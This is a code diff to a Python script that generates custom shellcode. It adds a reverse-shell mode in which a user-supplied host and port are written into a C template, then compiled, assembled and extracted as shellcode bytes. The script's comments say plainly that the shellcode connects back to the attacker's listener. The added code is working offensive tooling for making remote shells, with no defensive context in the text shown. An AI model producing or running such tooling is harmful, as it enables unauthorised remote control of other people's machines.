@@ -11,9 +11,11 @@ def main():
     # HANDLE USER ARGUMENTS
     #
     parser = argparse.ArgumentParser( description="This script will help develop and generate custom shellcode. If you've previously run the script be sure the --clean the directory to remove any old files!" )
-    parser.add_argument( "-p", "--payload", choices=['cmd', 'ps'], help="Select shellcode payload type" )
+    parser.add_argument( "-p", "--payload", choices=['cmd', 'ps', 'rs'], help="Select shellcode payload type" )
     parser.add_argument( "-c", "--command", help="The command to execute (required for cmd and ps modes)" )
     parser.add_argument( "-cl", "--clean", help="Clean the top level directory, removes all files except this py script and peb_structs.h", action="store_true" )
+    parser.add_argument( "-host", "--host", help="Specify the IP address or hostname for reverse shell" )
+    parser.add_argument( "-port", "--port", help="Specify the port for reverse shell" )
     args = parser.parse_args()
 
     if args.clean:
@@ -37,6 +39,15 @@ def main():
             parser.error( "The --comand argument is requried when mode is 'cmd' or 'ps'." )
         
         ps( args.command )
+    
+    #
+    # FUNCTION TO HANDLE REVERSE SHELL
+    #
+    if args.payload == "rs":
+        if not args.host or not args.port:
+            parser.error( "A --host and --port argument is required when mode is 'rs'." )
+        
+        rev_shell( args.host, args.port )
 
 
 
@@ -151,6 +162,66 @@ def ps( command ):
     #
     extract_shellcode()
 
+
+
+#
+# REVERSE SHELL FUNCTION
+#
+# HANDLES USER ADDRESS AND PORT AND GENERATES THE 
+# SHELLCODE TO CONNECT TO ATTACKER'S LISTENER
+#
+def rev_shell( in_address, in_port ):
+    print( f"[+] Generating shellcode to connect to attacker listener on: {in_address}:{in_port}" )
+    #
+    # MAKE THE DESIRED COMMAND INTO STACK STRING FORMAT
+    # 
+    formatted_host = ', '.join( "'" + char + "'" for char in in_address )
+
+    #
+    # PULL TEMPLATE FILE AND WRITE THE DESIRED COMMAND
+    #
+    try:
+        print( "[+] Pulling template file" )
+        with open("code_templates/rev_shell.c", 'r') as src_file, open("main.c", 'w') as dst_file:
+            for line in src_file:
+                if "char host[] =" in line: 
+                    replacement_line = "\tchar host[] = { " + formatted_host + ", '\\0' };\n" 
+                    dst_file.write( replacement_line )
+                    continue
+                
+                if "short port =" in line:
+                    replacement_line = "\tshort port = " + in_port + ";\n"
+                    dst_file.write( replacement_line )
+                    continue
+                
+                dst_file.write( line )
+       
+    except Exception as e:
+        print( f"[!] An error occurred: {e}" )
+
+    time.sleep(1)
+    
+    #
+    # COMPILE THE FILE
+    #
+    compile_asm()
+
+    #
+    # FIX THE ASSEMBLY
+    #
+    fix_assembly()
+
+    #
+    # COMPILE ASSEMBLY TO EXECUTABLE
+    # 
+    compile_exe()
+
+    #
+    # EXTRACT BYTES FROM SHELLCODE
+    #
+    extract_shellcode()    
+
+
 #
 # COMPILE TO ASM FUNCTION
 #
@@ -167,6 +238,7 @@ def compile_asm():
     print( compile_run.stderr )
 
     time.sleep(1)
+
 
 
 #
